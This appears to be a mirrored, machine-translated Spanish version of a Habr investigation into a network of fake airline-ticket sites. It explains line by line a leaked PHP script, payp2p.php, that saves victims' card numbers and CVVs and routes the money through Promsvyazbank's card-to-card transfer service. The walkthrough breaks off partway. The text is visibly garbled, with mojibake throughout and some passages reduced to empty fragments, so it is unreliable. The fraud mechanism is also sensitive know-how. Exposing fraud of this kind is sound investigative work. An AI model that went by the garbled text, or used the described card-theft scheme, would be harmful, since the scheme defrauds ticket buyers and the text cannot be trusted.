<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë∞ üïµüèº üïäÔ∏è Vuelos baratos ... Una red de sitios web fraudulentos que roban dinero de las tarjetas. La segunda investigaci√≥n. ¬øQu√© tiene que ver Promsvyazbank con √©l? ü•ö üóø üèåÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hace aproximadamente un mes, publiqu√© un art√≠culo en Geektimes, ‚ÄúBilletes de avi√≥n baratos ... O una red de sitios fraudulentos que roban dinero de la...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Vuelos baratos ... Una red de sitios web fraudulentos que roban dinero de las tarjetas. La segunda investigaci√≥n. ¬øQu√© tiene que ver Promsvyazbank con √©l?</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/398313/"><img src="https://habrastorage.org/files/dd5/971/335/dd59713351a348f29efad6370c8596f4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Hace aproximadamente un mes, publiqu√© un art√≠culo en Geektimes, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚ÄúBilletes de avi√≥n baratos ... O una red de sitios fraudulentos que roban dinero de las tarjetas. </font><font style="vertical-align: inherit;">Mi investigaci√≥n. </font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">La publicaci√≥n recibi√≥ una gran respuesta y una continuaci√≥n inesperada ...</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Perm√≠teme recordarte a aquellos que no han le√≠do la primera parte. En una publicaci√≥n basada en casos reales, se describieron esquemas en los que los estafadores roban dinero de boletos de compradores de boletos de aerol√≠neas que fueron imprudentes para llegar a un sitio de venta de boletos falsos. El n√∫mero de dichos sitios fraudulentos para la venta de boletos a√©reos en RuNet es de decenas y cientos (incluido el cerrado). En dichos sitios, al usuario se le muestra primero informaci√≥n real sobre los vuelos, se propone hacer un pedido y pagarlo con una tarjeta de cr√©dito. Todo se ve hermoso hasta que los compradores de boletos a√©reos descubren que se quedan sin dinero y sin boletos.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En todos los casos detectados, para robar dinero, dichos sitios utilizan los servicios de los bancos para transferir dinero de una tarjeta a otra (P2P). En la primera parte, se describi√≥ en detalle el mecanismo de c√≥mo la p√°gina de Tinkov Bank para el pago de una tarjeta a otra se disfraza e incrusta en sitios web fraudulentos, para que el "comprador" no note nada. Tambi√©n se mencion√≥ Promsvyazbank: fue a trav√©s de √©l que se rob√≥ dinero de la tarjeta de la v√≠ctima en la historia que se describi√≥. Y si no quedaban preguntas con el banco TKS, en el caso de Promsvyazbank no estaba claro c√≥mo se retir√≥ el dinero. La secuencia de comandos principal utilizada para robar dinero se ejecut√≥ en el lado del servidor y sin los c√≥digos fuente uno solo podr√≠a asumir lo que estaba haciendo.</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Y uno de los usuarios de Geektimes me contact√≥ y me envi√≥ el script payp2p.php que se utiliz√≥ recientemente en la mayor√≠a de los sitios de venta de boletos de aerol√≠neas fraudulentos. </font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Este script utiliza el servicio Promsvyazbank para transferir de una tarjeta a otra. </font><font style="vertical-align: inherit;">Y en mi opini√≥n, Promsvyazbank, al proporcionar su servicio, que fue f√°cil de enga√±ar, contribuy√≥ al crecimiento en el n√∫mero de estafadores de Internet.</font></font><a name="habracut"></a><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Probablemente hay otros bancos similares, pero esta publicaci√≥n tratar√° principalmente con Promsvyazbank. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Antes de comenzar el an√°lisis del script en s√≠, veamos c√≥mo se ve la p√°gina de pago de un sitio web fraudulento y c√≥mo se ve la p√°gina de traducci√≥n de una tarjeta a una tarjeta Promsvyazbank. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Parec√≠a la p√°gina de pago en sitios fraudulentos</font></font><br>
<img src="https://habrastorage.org/files/fe3/cf3/6d5/fe3cf36d5d294c8aa50b4338e9efde03.jpg"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Al analizar el c√≥digo HTML de esta p√°gina de pago, no encontr√© ninguna parte de las p√°ginas de ning√∫n banco, no se usan iframes integrados, no se usan scripts en absoluto, y la p√°gina en s√≠ es muy simple y no se parece a la p√°gina de Promsvyazbank. Los datos ingresados ‚Äã‚Äãen el formulario no se verifican mediante secuencias de comandos, sino mediante mecanismos integrados en los navegadores, utilizando los atributos "patr√≥n" y "requerido" para los campos de entrada de entrada y para las listas desplegables seleccionadas. Es decir incluso la p√°gina almacenada en el navegador en la unidad local permanece "operativa" y puede usarse para probar c√≥mo se interceptan los datos del mapa. Se utiliz√≥ una p√°gina similar guardada anteriormente como parte de esta publicaci√≥n para comprender c√≥mo funciona el script.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
De hecho, esta p√°gina es solo un formulario para ingresar un n√∫mero de tarjeta. </font><font style="vertical-align: inherit;">Cuando se confirma el formulario, el procesamiento se transfiere al programa payp2p.php.</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"b-card-feature-list clearfix"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"formPay"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"payp2p.php"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Payp2p.php puede hacer cualquier cosa. </font><font style="vertical-align: inherit;">Su c√≥digo no estaba disponible anteriormente para nosotros, ya que se ejecuta en el lado del servidor. </font><font style="vertical-align: inherit;">Pero como ya escrib√≠, ahora tenemos un c√≥digo y lo sabremos todo. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ahora veamos c√≥mo se ve la p√°gina de pago de tarjeta en tarjeta en el sitio de Promsvyazbank. </font></font><br>
<br>
<code>https://www.psbank.ru/Personal/eCommerce/Card2Card</code><br>
<img src="https://habrastorage.org/files/40d/469/71c/40d46971c2414e28bd4ef695c1e0d665.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como puede ver, la p√°gina de Promsvyazbank no se parece en nada a la p√°gina de pago presentada anteriormente. </font><font style="vertical-align: inherit;">Incluso el n√∫mero de campos de entrada para el n√∫mero de tarjeta no coincide. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Veamos el c√≥digo HTML de la p√°gina PSB para descubrir c√≥mo funciona. </font><font style="vertical-align: inherit;">Todo lo que necesitamos saber es en estas pocas l√≠neas:</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"card2card"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/P2P/card_form.html"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">frameborder</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">seamless</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">scrolling</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esta pieza significa que la p√°gina de pago real se encuentra en un dominio diferente, y lo que vemos en el sitio web de Promsvyazbank se muestra en una "ventana" con tecnolog√≠a iframe. </font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Me pregunto qui√©n posee el dominio 3ds.payment.ru.</font></font></b><div class="spoiler_text">   Whois.<br>
<br>
<code> 3ds.payment.ru<br>
IP 193.200.10.116<br>
 : PRSBM-NET <br>
:<br>
inetnum: 193.200.10.0 - 193.200.10.255<br>
netname: PRSBM-NET<br>
mnt-by: PROMSVYAZBANK-MNT<br>
<br>
C    online.payment.ru<br>
<img src="https://habrastorage.org/files/78b/0d3/8be/78b0d38be13f47f58128095526817a54.png"><br>
</code><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El dominio 3ds.payment.ru tambi√©n pertenece a Promsvyazbank. Recordaremos este dominio, todav√≠a se encontrar√° en la descripci√≥n m√°s de una vez. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Veamos cu√°l es la p√°gina que Promsvyazbank incorpora en su sitio, y posiblemente en algunos otros sitios. </font></font><br>
<br>
<code>https://3ds.payment.ru/P2P/card_form.html</code><br>
<img src="https://habrastorage.org/files/bf7/543/441/bf754344157647e1acf1fb55454c3179.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esta es una p√°gina real que se utiliza para transferencias de tarjeta a tarjeta. Como puede ver, esta p√°gina no tiene bordes. Esto se hace a prop√≥sito para que sea m√°s conveniente construir en otros sitios. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En el c√≥digo HTML de esta p√°gina nos interesa esta parte: </font></font><br>
<br>
<img src="https://habrastorage.org/files/8f5/996/3a5/8f59963a5d8c493aa4a38a90c911b92b.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
estos son campos de entrada ocultos para almacenar informaci√≥n de servicio. Tambi√©n recordaremos esta p√°gina. Y d√≥nde se usa se describir√° m√°s adelante. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La parte introductoria ha terminado, pasemos a la parte m√°s interesante y veamos c√≥mo funciona el script payp2p.php o c√≥mo funcion√≥.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El script es simple y no requiere ning√∫n conocimiento profundo del lenguaje de programaci√≥n PHP para comprenderlo. Por conveniencia, lo part√≠ en pedazos. A la izquierda est√°n los n√∫meros de l√≠nea a los que se puede hacer referencia. El gui√≥n no ha cambiado por completo en la forma en que se recibi√≥. Despu√©s de cada fragmento de c√≥digo, se presentar√° un descifrado y un ejemplo de los valores de las variables durante la ejecuci√≥n del programa (es decir, algo similar a la depuraci√≥n). En algunos lugares, es posible realizar comentarios excesivos, esto se hace para que los lectores que no son de programaci√≥n tambi√©n puedan comprender el significado del c√≥digo del programa.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para las pruebas, necesitamos un formulario en el que deber√° ingresar los datos de la tarjeta con los que se supone el pago. Utilizaremos el formulario guardado anteriormente. El aspecto del formulario en el sitio fraudulento se muestra en la imagen al comienzo del art√≠culo. Sobre el formulario se escribir√° m√°s abajo. Para la prueba, ingrese el n√∫mero de tarjeta 1111.2222.3333.4444. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Empecemos </font></font><br>
<br>
<img src="https://habrastorage.org/files/f45/3a9/754/f453a9754241406eb6089527f5e25336.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 3: no ejecuta ning√∫n comando. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 4: se carga un archivo dbconfig.php separado en el que se almacenan los par√°metros para conectarse a la base de datos MySQL. A continuaci√≥n se muestra una captura de pantalla del c√≥digo dbconfig.php y su an√°lisis.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 6: nos conectamos al servidor MySQL, en cuya base de datos almacenaremos datos sobre tarjetas robadas y transferencias de dinero realizadas. Esta l√≠nea se conecta simult√°neamente al servidor MySQL y sale del programa si la conexi√≥n falla por alg√∫n motivo. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 11: seleccione la codificaci√≥n para trabajar con la base de datos MySQL. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 13: nos conectamos al servidor MySQL anteriormente, ahora seleccionamos la base de datos con la que trabajaremos. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El script payp2p.php comienza a funcionar despu√©s de que un usuario enga√±ado completa un formulario en una p√°gina similar a una p√°gina de pago en l√≠nea normal. Al hacer clic en el bot√≥n "Pagar" en el formulario, el script payp2p.php recibe los datos ingresados ‚Äã‚Äãen el formulario. Los datos del formulario al script se transmiten utilizando el m√©todo POST.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 16: el n√∫mero de tarjeta de cr√©dito ingresado en el formulario de la p√°gina anterior se guarda en la variable $ num. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 17: el mes / a√±o del per√≠odo de validez de la tarjeta se almacena en la variable $ date. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 18: el c√≥digo CVV de la tarjeta se guarda en la variable $ cvv. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 19: en la variable $ code, un cierto c√≥digo se genera antes al realizar el "pedido de boletos a√©reos". Este c√≥digo se utiliza para que el usuario pueda ver su pedido a trav√©s de un enlace especial. El mismo c√≥digo se utiliza para identificar el pedido (en la p√°gina de pago, para mostrar autom√°ticamente el monto del pago; si los estafadores lo guardan al guardar en el "libro de ventas", este c√≥digo tambi√©n se transmite al formulario de pago, probablemente como un identificador de transferencia (m√°s sobre esto a continuaci√≥n).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 21-22 Se forma una l√≠nea: una consulta SQL, que luego se ejecuta. </font><font style="vertical-align: inherit;">La consulta SQL agrega a la tabla 'tarjeta' los valores del identificador del pedido, la cantidad, el per√≠odo de validez de la tarjeta, el c√≥digo CVV de la tarjeta y la hora actual exacta. </font><font style="vertical-align: inherit;">A continuaci√≥n se muestra un ejemplo de un registro en la base de datos.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ejemplo de informaci√≥n de depuraci√≥n</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/051/283/424/0512834248fd4c1fa7498ed3f98e72e7.png"><br>
<br>
        ¬´ ¬ª      ¬´ ¬ª.    ,     .    .<br>
<br>
"√¢√°√®√¢" = ''    ISO8859-1 =&gt;Windows-1251<br>
  ,  .  .</div></div> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dirija temporalmente nuestra atenci√≥n temporalmente al archivo dbconfig.php. </font></font><br>
<br>
<img src="https://habrastorage.org/files/100/d2a/13b/100d2a13b3544f60afeeab0efc768b85.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aqu√≠ est√°n los par√°metros para conectarse a la base de datos. </font><font style="vertical-align: inherit;">De lo que puede ser interesante:</font></font><br>
<br>
<blockquote>DBHOST ‚Äî  ,    MySQL  (    MySQL     ,     ,       )<br>
DBNAME ‚Äî   <br>
DBUSER ‚Äî        MySQL<br>
DBPASS ‚Äî       MySQL <br>
SECURE_AUTH_KEY ‚Äî      -   .      ,   ,    , .     .</blockquote><br>
<img src="https://habrastorage.org/files/c5c/9bf/0b1/c5c9bf0b1afb4d8ba298ce8953076dee.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 28: se conecta un archivo aviacfg.php de terceros. Este es un archivo de configuraci√≥n que almacena n√∫meros de tarjetas de destinatarios y otras configuraciones. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 29: se crea una matriz a partir de los n√∫meros de tarjeta que est√°n separados por un salto de l√≠nea en el archivo de configuraci√≥n. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 30-31: a la variable $ crd se le asigna aleatoriamente el n√∫mero de una de las tarjetas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Veamos qu√© tenemos en el archivo aviacfg.php</font></font><br>
<br>
<img src="https://habrastorage.org/files/14b/2bd/b16/14b2bdb16dc74b7990b743146d9bc72c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aqu√≠ vemos que la variable $ aviacfg es una matriz que contiene los valores de descuento (descuento) y tarjetas (n√∫meros de tarjeta para los que se esperan retiros). En este ejemplo, solo hay un n√∫mero de tarjeta, pero puede haber cualquier n√∫mero de ellos. El nombre del archivo (aviacfg.php) y la variable ($ aviacfg) en s√≠ indica para qu√© √°rea se agudiz√≥ este script. El valor de descuento determina el porcentaje de precios en un sitio web fraudulento que se mostrar√° m√°s barato de lo que realmente se venden en un sitio web de billetes de avi√≥n "honesto". El propietario de un sitio web fraudulento puede hacer que el precio de las entradas sea m√°s barato. Cuanto m√°s bajo sea el precio mostrado, m√°s probable es que uno de los compradores potenciales se arriesgue a comprar boletos en un sitio desconocido. Sobre el descuento habr√° un comentario m√°s adelante sobre exactamente c√≥mo se implementa en el c√≥digo.</font></font><br>
<br>
<img src="https://habrastorage.org/files/dd5/971/335/dd59713351a348f29efad6370c8596f4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Adem√°s, el monto de la transferencia, el n√∫mero de la tarjeta a la que se realiza la transferencia y el c√≥digo que identifica el pedido de boletos a√©reos en un sitio web fraudulento se almacenan en la base de datos MySQL. </font><font style="vertical-align: inherit;">A continuaci√≥n se presentar√° un ejemplo de un registro en la base de datos.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ejemplo de informaci√≥n de depuraci√≥n</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/4ee/0e7/b46/4ee0e7b46d584bb68631adb4339b86e9.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/111/e13/e09/111e13e09e2246b4bbb9a3cdb6cab651.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 40: a la variable $ p112 se le asigna un valor con el n√∫mero de tarjeta que se ingres√≥ anteriormente en el formulario. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 41-51: el n√∫mero de tarjeta se divide en partes de cuatro d√≠gitos. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 53-57: se verifica la longitud del n√∫mero de tarjeta. Si en el n√∫mero de tarjeta el n√∫mero de caracteres difiere de 16 o 18, se produce una salida. Se muestra un mensaje durante cinco segundos y luego se redirige a otra p√°gina. En este ejemplo, la devoluci√≥n ser√° a la p√°gina de pedido en el sitio fraudulento. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En la l√≠nea 56 "Iaaa? Iua aaiiua ea? Ou" al convertir la codificaci√≥n ISO8859-1 =&gt; Windows-1251 corresponde al texto: "Datos de tarjeta no v√°lidos". </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 58-61: a las variables $ p4, $ p5, $ p6, $ p11 se les asignan los valores ingresados ‚Äã‚Äãanteriormente en el formulario (fecha de vencimiento de la tarjeta, c√≥digo CVV, monto del pago).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 63: en la variable $ info se guardan todos los datos de la tarjeta y el monto de la transferencia. </font><font style="vertical-align: inherit;">Al formar, se usan saltos de l√≠nea "\ n" y separadores "### ...". </font><font style="vertical-align: inherit;">Esta variable no se usa en ning√∫n otro lado. </font><font style="vertical-align: inherit;">Al finalizar el script, se puede usar para guardar registros en un archivo de texto normal o para mostrar durante la depuraci√≥n.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ejemplo de informaci√≥n de depuraci√≥n</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/413/f55/39d/413f5539d0fa45f3aee1853c62d0005f.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/347/9f7/0d5/3479f70d54804bb2b25f111021820c1c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 66-75: esta es en realidad una duplicaci√≥n del bloque de l√≠neas 27-36. Una vez m√°s, la tarjeta receptora se selecciona aleatoriamente del archivo de configuraci√≥n aviacfg.php, y todo esto se guarda en la tabla de la base de datos card_balance. Por lo tanto, en la tabla card_balance, con cada intento de transferencia, se crear√°n dos registros. Si solo una tarjeta de destinatario est√° obstruida en aviacfg.php, con muestreo aleatorio, por supuesto, siempre se seleccionar√° la misma tarjeta. En este caso, las entradas en la tabla card_balance simplemente se duplicar√°n. Pero en caso de que varios n√∫meros de tarjeta est√©n obstruidos en aviacfg.php, con un muestreo aleatorio los resultados ser√°n diferentes y habr√° un registro en la tabla card_balance, el primero es incorrecto y el segundo es correcto.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esto es un error, y los compradores del gui√≥n (habr√° un comentario por separado sobre ellos) pueden pedirle al desarrollador que compense el da√±o moral asociado con el hecho de que las traducciones reales son al menos dos veces menos que las entradas de registro.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ejemplo de informaci√≥n de depuraci√≥n</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/33b/867/4db/33b8674db56f462ba652d8caf33b418a.png"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ejemplo de entradas de bases de datos MySQL</font></font></b><div class="spoiler_text">        .           : ¬´card¬ª  ¬´card_balance¬ª.               ,             .<br>
<br>
,         , ‚Äî   .      .<br>
<br>
 ¬´card¬ª.<br>
<br>
<img src="https://habrastorage.org/files/4e9/e3c/454/4e9e3c45420a4d84b73a857184fe7155.jpg"><br>
<br>
 ¬´card_balance¬ª.<br>
<img src="https://habrastorage.org/files/98c/4a0/355/98c4a03559ba40e8a46adb2fdf950b54.jpg"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tenga en cuenta que en el primer caso, solo las tarjetas de remitente sin cantidad, pero con el tiempo exacto, se almacenan en la tabla de la base de datos MySQL, y en el segundo caso, se guardan los datos sobre las transferencias realizadas (m√°s precisamente, sobre los intentos de transferencias). </font><font style="vertical-align: inherit;">El n√∫mero y la cantidad de la tarjeta del destinatario se guardan, los datos del remitente no se guardan en la segunda tabla. </font><font style="vertical-align: inherit;">En ambos casos, el "ID de pedido" se almacena adicionalmente.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La primera parte de la secuencia de comandos, que se describi√≥ anteriormente, se puede llamar arbitrariamente "entrada en el libro de ventas para contabilidad". Ella no tiene relaci√≥n con la transferencia de dinero. Para transferir dinero, puede hacerlo sin guardar datos en la base de datos. Sin embargo, vemos que los datos de la tarjeta se guardan, lo que significa que en el futuro se pueden usar adicionalmente para robar dinero de las tarjetas "en modo manual". Los datos de la tarjeta se pueden vender o usar, por ejemplo, para pagar la publicidad en Yandex.Direct, como se muestra en el art√≠culo anterior. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La segunda parte del script se relaciona con la transferencia de dinero a trav√©s del sitio de Promsvyazbank 3ds.payment.ru. </font></font><br>
<br>
<img src="https://habrastorage.org/files/2b4/0cb/7fc/2b40cb7fc61f4b9598409fbfcc5ae00f.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La l√≠nea 78 del comentario indica que se supone que la p√°gina de confirmaci√≥n de un pago exitoso tiene una direcci√≥n como "/sus.php?cd=BX3FKT". Si tiene √©xito, el usuario debe ser devuelto a esta direcci√≥n.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 80-91 Para realizar una traducci√≥n, primero debe ir a la p√°gina de servicio. </font></font><br>
<br>
<code>https://3ds.payment.ru/cgi-bin/get_trans_cond_p2p</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font></font><br>
<img src="https://habrastorage.org/files/e04/5eb/8e4/e045eb8e4a4d42c6be37ff2946da439c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esta p√°gina muestra algo como esta l√≠nea:</font></font><br>
<br>
<pre><code class="hljs json">{<span class="hljs-attr"><span class="hljs-attr">"ORDER_NUM"</span></span>:<span class="hljs-string"><span class="hljs-string">"20161027070425023400"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"TIMESTAMP"</span></span>:<span class="hljs-string"><span class="hljs-string">"20161027070425"</span></span>}</code></pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
"ORDER_NUM" es ~ "N√∫mero de pedido", "TIMESTAMP" es la marca de tiempo actual. Si la p√°gina se actualiza, siempre se emiten nuevos datos. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para leer una p√°gina web o enviar datos a una p√°gina web, use el comando curl. Curl (cURL) le permite conectarse mediante programaci√≥n a servidores web utilizando varios protocolos, incluidos http y https. En nuestro caso, curl es un navegador web de software que puede guardar p√°ginas web en variables. La p√°gina almacenada en la variable es una l√≠nea muy larga con el c√≥digo fuente HTML de esta p√°gina. Puede trabajar con tales variables de cadena de la misma manera que con cualquier cadena: puede buscar texto, reemplazar texto, etc. Curl en los scripts descritos se usar√° varias veces.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 80: la URL se almacena en la variable $ login_url. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 81: la URL se almacena en la variable $ agent. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 82 - Inicializa la sesi√≥n de cURL. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
